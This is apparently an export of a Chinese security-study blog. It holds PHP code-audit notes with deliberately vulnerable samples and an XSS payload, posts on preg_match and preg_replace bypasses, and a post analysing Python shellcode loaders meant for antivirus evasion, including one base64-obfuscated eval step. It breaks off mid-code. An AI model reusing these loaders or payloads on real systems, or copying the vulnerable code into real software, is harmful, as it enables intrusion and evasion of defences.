<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827201453222.png" alt="image-20220827201453222"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$content = $_GET[&#x27;content&#x27;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var xss = &#x27;&lt;?php echo $content?&gt;&#x27;;</span><br><span class="line">    document.write(xss);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">//payload是123%27;&lt;/script&gt;&lt;script&gt;alert(`xss`)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>存储其实和反射差不多，只不过大多是存在数据库的，需要别人点击去触发。</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827203219636.png" alt="image-20220827203219636"></p>
<p>dom既可能是存储型，也可能是反射型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$content = $_GET[&#x27;content&#x27;];</span><br><span class="line">?&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&lt;?php echo $content;?&gt;&quot;&gt;</span><br><span class="line">&lt;dic id=&quot;print&quot;&gt;&lt;/dic&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var text = document.getElementById(&quot;text&quot;);</span><br><span class="line">    var print = document.getElementById(&quot;print&quot;);</span><br><span class="line">    print.innerHTML = text.value;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827210315089.png" alt="image-20220827210315089"></p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220827210740514.png" alt="image-20220827210740514"></p>
<h1 id="csrf漏洞"><a href="#csrf漏洞" class="headerlink" title="csrf漏洞"></a>csrf漏洞</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">挖掘思路</span><br><span class="line">后台功能模块：管理后台，会员中心，添加用户等</span><br><span class="line">被引用的核心文件里面没有验证token和referer相关的代码</span><br><span class="line"></span><br><span class="line">没带token:可以直接请求这个页面</span><br><span class="line">没带referer:返回相同的数据</span><br></pre></td></tr></table></figure>

<p>这个简单，我就不写代码了，就是后端只验证了session，但是没有验证origin或者referer等参数，或者没有加上csrftoken，导致这么一个漏洞。</p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件上传可控点</span><br><span class="line">content-length，即上传内容大小</span><br><span class="line">MAX_FILE_SIZE,即上传内容的最大长度</span><br><span class="line">filename,即上传文件名</span><br><span class="line">content-type，即上传文件内心</span><br><span class="line">请求保重的乱码字段，即上传文件的内容</span><br><span class="line">有可能存在请求包中的可控点还有上传路径，只是上面的示例中没有出现</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">挖掘思路</span><br><span class="line">上传点都调用同一个上传类，直接全局搜索上传函数</span><br><span class="line">黑盒寻找上传点，代码定位</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码案例</span><br><span class="line">name：客户端的原始上传文件名称</span><br><span class="line">Type：上传文件的MIME类型</span><br><span class="line">Tmp_name：服务器端用来保存上传文件的临时文件夹</span><br><span class="line">Error：上传文件时的错误信息</span><br><span class="line">Size：上传文件的大小，单位是</span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$upload_dir</span> = <span class="string">&quot;D:\phpStudy\PHPTutorial\WWW\daima\upload&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$upload_name</span> = <span class="variable">$upload_dir</span>.<span class="string">&quot;\\&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$upload_name</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type:&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Size:&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]/<span class="number">1024</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Name&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>upload.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;上传文件&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;MAX_FILE_SIZE&quot;</span> <span class="attr">name</span>=<span class="string">&quot;4096&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>下面的绕过讲师只是提一下，后面我可能自己会总结</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件上传绕过-客户端</span><br><span class="line">用firebug将form表单中的onsubmit事件删除</span><br><span class="line">上传木马文件，burp拦截数据包，修改扩展名</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件上传绕过-服务端</span><br><span class="line">黑白名单过滤</span><br><span class="line">修改mime类型</span><br><span class="line">截断上传攻击</span><br><span class="line">.htaccess文件攻击</span><br><span class="line">解析漏洞，文件包含漏洞</span><br><span class="line">目录验证</span><br></pre></td></tr></table></figure>

<h1 id="目录穿越以及文件包含"><a href="#目录穿越以及文件包含" class="headerlink" title="目录穿越以及文件包含"></a>目录穿越以及文件包含</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    readfile(<span class="string">&#x27;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220828162149341.png" alt="image-20220828162149341"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目录穿越绕过方式</span><br><span class="line">进行url编码</span><br><span class="line">进行16位unicode编码</span><br><span class="line">进行双倍url编码</span><br><span class="line">进行超常utf-8 unicode编码</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220828162321840.png" alt="image-20220828162321840"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目录穿越修复方案</span><br><span class="line">在url中不要使用文件名称作为参数</span><br><span class="line">检查使用者输入的文件名是否有目录阶层字符</span><br><span class="line">在php.ini文件中设置open_basedir来指定文件的目录</span><br><span class="line">使用realpath函数来展开文件路径中的&quot;./&quot;、&quot;../&quot;等字符，然后返回绝对路径名称</span><br><span class="line">使用basename函数来返回不包含路径的文件名称</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件包含-挖掘经验</span><br><span class="line"></span><br><span class="line">模块加载，cache调用，传入的参数拼接包含路径</span><br><span class="line"></span><br><span class="line">include()</span><br><span class="line">使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行</span><br><span class="line"></span><br><span class="line">inclue_once()</span><br><span class="line">功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次</span><br><span class="line"></span><br><span class="line">require()</span><br><span class="line">使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</span><br><span class="line"></span><br><span class="line">require_once()</span><br><span class="line">功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">远程包含</span><br><span class="line">RFI允许攻击者包含远程文件，远程文件包含需要设置allow_url_include = On 四个文件都支持HTTP、FTP等协议，相对本地文件包含更容易利用</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地包含-利用方式</span><br><span class="line">%00截断</span><br><span class="line"></span><br><span class="line">记录错误日志文件</span><br></pre></td></tr></table></figure>

<p>远程包含-利用方式</p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220828170533205.png" alt="image-20220828170533205"></p>
<h1 id="任意文件读取及删除漏洞"><a href="#任意文件读取及删除漏洞" class="headerlink" title="任意文件读取及删除漏洞"></a>任意文件读取及删除漏洞</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件读取-挖掘经验</span><br><span class="line">allow_url_fopen选项激活了URL形式的fopen封装协议是的可以访问URL对象例如文件，默认的封装协议提供ftp和http协议来访问远程文件，一些扩展库例如zlib可以能会注册更多的封装协议</span><br><span class="line"></span><br><span class="line">fopen()</span><br><span class="line">file_get_contents()</span><br><span class="line">fread</span><br><span class="line">fgets</span><br><span class="line">fgetss</span><br><span class="line">file</span><br><span class="line">fpassthru</span><br><span class="line">parse_ini_file</span><br><span class="line">readfile</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件删除-挖掘经验</span><br><span class="line">unlink($file,$cont)</span><br></pre></td></tr></table></figure>

<h1 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">漏洞危害</span><br><span class="line">比如说文件上传页面的白名单，我们可以覆盖白名单导致文件上传</span><br><span class="line">用户注册页面控制没覆盖的未初始化变量导致sql</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220828172043564.png" alt="image-20220828172043564"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常见的遍历方式释放代码，可能导致变量覆盖漏洞</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_COOKIE&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_GET&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_key</span> =&gt; <span class="variable">$_value</span>)&#123;</span><br><span class="line">        <span class="variable">$$_key</span> = addslashes(<span class="variable">$_value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extract()变量覆盖</span><br><span class="line">int extract( $array , extract_rules,prefix )</span><br><span class="line">$array 关联的数组，受第二个和第三个参数的影响</span><br><span class="line">extract_rules  对待非法/数字和冲突的键名的方法将根据去除标记</span><br><span class="line">prefix  尽在第二个参数特殊时需要，添加前缀</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220829141621485.png" alt="image-20220829141621485"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">parse_str()变量覆盖</span><br><span class="line">void parse_str(string $encoded_string [,array &amp;$result])</span><br><span class="line">incoded_string输入的字符串</span><br><span class="line">result 变量将会以数组元素的形式存入到这个数组，作为替代</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import_request_variables()</span><br><span class="line">（PHP 4&gt;= 4.1.0 , php5 &lt; 5.4.0）</span><br><span class="line">bool import_request_variables(string $types[,string $prefix])</span><br><span class="line">$type 指定需要导入的变量。可以用字母&#x27;G&#x27;,&#x27;P&#x27;,&#x27;C&#x27;来表示get，post，cookie</span><br><span class="line">$prefix 变量名前缀</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修复方案</span><br><span class="line">在php.ini文件中设置register_globals=off</span><br><span class="line">使用原始变量数组，如$_POST,$_GET等数组变量进行操作</span><br><span class="line">不适用foreach语句来遍历$_GET变量，而改用[(index)]来指定</span><br><span class="line">验证变量是否存在，注册变量前先判断变量是否存在</span><br></pre></td></tr></table></figure>

<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">serialize()</span><br><span class="line">unserialize()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">漏洞成因</span><br><span class="line">反序列化对象中存在魔术方法，而且魔术方法中的代码可以被控制，漏洞根据不同的代码可以导致各种攻击，如代码注入、sql注入、目录遍历等等</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">序列化的不同结果</span><br><span class="line">public</span><br><span class="line">private</span><br><span class="line">protect</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test1</span> = <span class="string">&quot;dhk 2002&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test2</span> = <span class="string">&quot;dhk 2002&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$test3</span> = <span class="string">&quot;dhk 2002&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220829144838482.png" alt="image-20220829144838482"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">漏洞本质</span><br><span class="line">unserialize函数的变量可控</span><br><span class="line">php文件中存在可利用的类，类中有魔术方法</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220829150623976.png" alt="image-20220829150623976"></p>
<h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量类型</span><br><span class="line">标准类型：布尔boolen、整型integer、浮点floadt、字符string</span><br><span class="line">复杂类型：数组array、对象object</span><br><span class="line">特殊类型：资源resource</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220829155633444.png" alt="image-20220829155633444"></p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220829155648037.png" alt="image-20220829155648037"></p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220829155656537.png" alt="image-20220829155656537"></p>
<p><img src="/2022/08/29/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/image-20220829155706905.png" alt="image-20220829155706905"></p>
<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://协议</span><br><span class="line">用于访问本地系统文件</span><br><span class="line">allow_url_fopen:off/on</span><br><span class="line">allow_url_include:off/on</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter</span><br><span class="line">读取源代码并进行base64编码输出</span><br><span class="line">allow_url_fopen:off/on</span><br><span class="line">allow_url_include:off/on</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://input</span><br><span class="line">可以访问请求的原始数据的只读流</span><br><span class="line">allow_url_fopen:off/on</span><br><span class="line">allow_url_include:on</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://</span><br><span class="line">数据</span><br><span class="line">allow_url_fopen:on</span><br><span class="line">allow_url_include:on</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-daima</category>
      </categories>
  </entry>
  <entry>
    <title>preg_match绕过总结</title>
    <url>/2021/12/27/preg-match%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="preg-match绕过总结"><a href="#preg-match绕过总结" class="headerlink" title="preg_match绕过总结"></a>preg_match绕过总结</h1><h2 id="什么是preg-match"><a href="#什么是preg-match" class="headerlink" title="什么是preg_match"></a>什么是preg_match</h2><p><img src="/2021/12/27/preg-match%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/image-20211127190707622.png" alt="image-20211127190707622"></p>
<p><img src="/2021/12/27/preg-match%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/image-20211127190733516.png" alt="image-20211127190733516"></p>
<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p><img src="/2021/12/27/preg-match%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/image-20211127191003150.png" alt="image-20211127191003150"></p>
<p><img src="/2021/12/27/preg-match%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/image-20211127191733611.png" alt="image-20211127191733611"></p>
<p><img src="/2021/12/27/preg-match%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/image-20211127191742739.png" alt="image-20211127191742739"></p>
<p><a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">preg_match绕过总结 - MustaphaMond - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>preg_replace()函数的e漏洞</title>
    <url>/2021/12/27/preg-replace-%E5%87%BD%E6%95%B0%E7%9A%84e%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="preg-replace-函数的-e漏洞"><a href="#preg-replace-函数的-e漏洞" class="headerlink" title="preg_replace()函数的/e漏洞"></a>preg_replace()函数的/e漏洞</h3><p><img src="/2021/12/27/preg-replace-%E5%87%BD%E6%95%B0%E7%9A%84e%E6%BC%8F%E6%B4%9E/image-20211124220045332.png" alt="image-20211124220045332">使用案例：</p>
<p><img src="/2021/12/27/preg-replace-%E5%87%BD%E6%95%B0%E7%9A%84e%E6%BC%8F%E6%B4%9E/1.png" alt="运用实例"></p>
<p>以及php中的system命令</p>
<p>cd  &amp;&amp;ls 是进入文件夹然后显示全部文件</p>
<p>cat用于打开php文件</p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>python-shellcode加载器分析</title>
    <url>/2022/10/12/python-shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="python-shellcode加载器分析"><a href="#python-shellcode加载器分析" class="headerlink" title="python-shellcode加载器分析"></a>python-shellcode加载器分析</h1><p>因为最近在学习免杀，所以写个小文来分析一下py的shellcode加载器</p>
<p>shellcode：一段可以由电脑直接执行的机器码，执行后可以搭建起stranger。<br>加载器：将shellcode加载进内存，并开始执行的程序。</p>
<h1 id="加载器1-普通型（失败"><a href="#加载器1-普通型（失败" class="headerlink" title="加载器1-普通型（失败"></a>加载器1-普通型（失败</h1><p>这个加载器就是要报内存地址的错误，本人学艺不精，暂时还无法解决，但我看和市面上的代码一样，所以还是拖过来做一个分析，至少可以了解其中的一些原理，估计是里面的类型的一些问题。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests  <span class="comment">#导入了几个库</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span>   <span class="comment"># b&#x27; &#x27; 表示这是一个 bytes 对象</span></span><br><span class="line">shellcode=<span class="built_in">bytearray</span>(shellcode) <span class="comment">#bytearray() 方法返回一个新字节数组。</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64  <span class="comment">#设置VirtualAlloc返回类型为ctypes.c_uint64。64位操作系统返回的地址需要是该类型。</span></span><br><span class="line"><span class="comment">#VirtualAlloc是Windows提供的API，通常用来分配大块的内存</span></span><br><span class="line"></span><br><span class="line">ptr=ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>),ctypes.c_int(<span class="built_in">len</span>(shellcode)),ctypes.c_int(<span class="number">0x3000</span>),ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment">#申请了一个内存地址，lpAddress 是指定内存开始的地址。dwSize 是分配内存的大小。flAllocationType 是分配内存的类型。flProtect 是访问这块分配内存的权限。这多半就是其中四个参数的含义。ctypes.c_int(x)是指将x转为C语言中的int类型</span></span><br><span class="line"></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode) <span class="comment">#定义了一个缓冲区数组，把shellcode写进去了  将shellcode指向指针</span></span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLGJ1ZixjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKQ==&#x27;</span></span><br><span class="line"><span class="built_in">eval</span>(base64.b64decode(s))</span><br><span class="line"><span class="comment">#这一段是</span></span><br><span class="line"><span class="comment">#ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))</span></span><br><span class="line"><span class="comment">#从指定内存中复制内存至另一内存里.简称:复制内存.Destination ：指向移动目的地址的指针。Source ：指向要复制的内存地址的指针。Length ：指定要复制的字节数。也就是把缓冲区的shellcode写入申请好的内存地址</span></span><br><span class="line"></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(<span class="comment">#要创建在另一个进程的虚拟地址空间中运行的线程，因为shellcode从零开始运行的，所以这里也从零开始，大概是第一个参数把。</span></span><br><span class="line">	ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">	ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">	ctypes.c_int(ptr),</span><br><span class="line">	ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">	ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">	ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">	)</span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br><span class="line"><span class="comment">#正常的话我们创建的线程是需要一直运行的，所以将时间设为负数，等待时间将成为无限等待，程序就不会结束</span></span><br></pre></td></tr></table></figure>

<p>在我将返回类型改成c_void_p以及一个指针改成c_void_p的时候，就不报错了，但是依然上不了线，留着明天来进行分析了</p>
<h1 id="加载器2-普通型（成功"><a href="#加载器2-普通型（成功" class="headerlink" title="加载器2-普通型（成功"></a>加载器2-普通型（成功</h1><p>主要是利用ctypes库来调用windows的api来完成加载shellcode的操作</p>
<p>用的y4tacker师傅的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#这前三个函数上面讲过了，我就简单写一下就好了</span></span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc<span class="comment">#分配内存</span></span><br><span class="line">RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory<span class="comment">#将shellcode写入内存</span></span><br><span class="line">CreateThread = ctypes.windll.kernel32.CreateThread<span class="comment">#创建线程</span></span><br><span class="line">WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject  <span class="comment">#等待线程结束调用WaitForSingleObject函数用来检测线程的状态WaitForSingleObject函数原型和参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#DWORD WINAPI WaitForSingleObject(</span></span><br><span class="line"><span class="comment">#__in HANDLE hHandle,     #对象句柄。可以指定一系列的对象</span></span><br><span class="line"><span class="comment">#__in DWORD dwMilliseconds  #定时时间间隔</span></span><br><span class="line"><span class="comment">#);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#我的shellcode用的cs生成的</span></span><br><span class="line"><span class="comment"># length: 893 bytes</span></span><br><span class="line">buf = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(buf)</span><br><span class="line">VirtualAlloc.restype = ctypes.c_void_p  <span class="comment"># 重载函数返回类型为void</span></span><br><span class="line">p = VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), <span class="number">0x3000</span>, <span class="number">0x00000040</span>)  <span class="comment"># 申请内存</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)  <span class="comment"># 将shellcode指向指针</span></span><br><span class="line">RtlMoveMemory(ctypes.c_void_p(p), buf, ctypes.c_int(<span class="built_in">len</span>(shellcode)))  <span class="comment"># 复制shellcode进申请的内存中</span></span><br><span class="line">h = 